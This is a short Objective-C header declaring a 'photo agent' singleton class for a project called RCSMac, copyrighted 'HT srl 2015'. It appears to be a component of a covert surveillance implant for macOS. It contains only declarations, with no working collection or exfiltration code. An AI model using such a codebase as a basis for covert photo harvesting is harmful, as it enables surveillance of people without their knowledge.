/*
 * RCSMAgentPhoto.h
 * RCSMac
 * Photo Agent
 *
 *
 * Created by J on 27/05/2015
 * Copyright (C) HT srl 2015. All rights reserved
 *
 */


#ifndef __RCSMAgentPhoto_h__
#define __RCSMAgentPhoto_h__

#import <Foundation/Foundation.h>
#import "RCSMLogManager.h"


#define MARKUP_KEY @"date"

@interface __m_MAgentPhoto : NSObject <__m_Agents>
{
@private
    NSMutableDictionary *mConfiguration;
    NSMutableDictionary *markup;
}

+ (__m_MAgentPhoto *)sharedInstance;
- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;

@end

#endif
